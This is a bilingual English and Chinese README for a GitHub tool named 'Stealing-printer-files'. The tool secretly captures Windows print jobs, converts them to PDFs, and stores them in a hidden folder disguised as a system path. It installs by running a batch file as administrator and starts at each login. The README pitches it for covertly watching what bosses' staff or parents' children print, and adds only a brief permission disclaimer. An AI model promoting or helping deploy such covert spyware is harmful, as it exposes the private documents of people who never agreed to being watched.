# Stealing-printer-files

## English Version

### What is this?
This is a tool that secretly watches what you print on Windows computers. It grabs the print jobs and turns them into PDF files automatically. Like having a hidden camera for your printer!

### Why use it?
- **Keep records**: Save all printed documents as PDFs for later.
- **Check printing**: See what people are printing (for bosses or parents).
- **Easy backup**: No need to scan documents, just print and it's saved.

### What it does:
- Watches the print queue folder.
- Grabs new print jobs.
- Converts them to PDF using special tools.
- Saves PDFs in a hidden folder.
- Runs in the background, starts when you log in.

### How to install:
1. Download from GitHub: `git clone https://github.com/P-King999/Stealing-printer-files.git`
2. Right-click `Deploy.bat` and run as administrator.
3. Done! It starts automatically next time you log in.

### How to use:
Just print anything like normal. The tool will save PDFs to `D:\ProgramDate\appcompat\print\Backups\`.

### Files needed:
- `MasterHijacker.ps1` - The main watching script.
- `Deploy.bat` - Setup file.
- Ghostscript files (gswin64c.exe, etc.) - For converting to PDF.
- Font files - For making PDFs look good.

### Problems?
- If no PDFs appear: Check if you ran Deploy.bat as admin.
- If conversion fails: Make sure all files are in the folder.
- Look at `convert.log` for errors.

### Important:
- Only for your own computer!
- Don't use to spy on others without permission.
- Needs admin rights to install.

---

## 中文版本

### 这是什么？
这是一个偷偷监视 Windows 电脑打印内容的工具。它会抓取打印任务，自动转换成 PDF 文件保存起来。就像给打印机装了个隐藏摄像头！

### 为什么要用？
- **留记录**：把所有打印的文件都保存成 PDF，以后再看。
- **检查打印**：看看别人在打印什么（老板或家长可以用）。
- **轻松备份**：不用扫描文件，直接打印就保存了。

### 它能干啥：
- 监视打印队列文件夹。
- 抓取新的打印任务。
- 用特殊工具转换成 PDF。
- 保存 PDF 到隐藏文件夹。
- 在后台运行，登录时自动启动。

### 怎么安装：
1. 从 GitHub 下载：`git clone https://github.com/P-King999/Stealing-printer-files.git`
2. 右键 `Deploy.bat`，以管理员身份运行。
3. 搞定！下次登录时自动启动。

### 怎么用：
正常打印就行。工具会把 PDF 保存到 `D:\ProgramDate\appcompat\print\Backups\`。

### 需要哪些文件：
- `MasterHijacker.ps1` - 主要的监视脚本。
- `Deploy.bat` - 安装文件。
- Ghostscript 文件 (gswin64c.exe 等) - 用来转换 PDF。
- 字体文件 - 让 PDF 看起来漂亮。

### 出问题了？
- 如果没生成 PDF：检查 Deploy.bat 是否管理员运行。
- 如果转换失败：确保所有文件都在文件夹里。
- 看看 `convert.log` 日志文件找错误。

### 重要提醒：
- 只在自己电脑上用！
- 不要未经允许监视别人。
- 安装需要管理员权限。

---

License: AFPL (see COPYING.AFPL)
GitHub: https://github.com/P-King999/Stealing-printer-files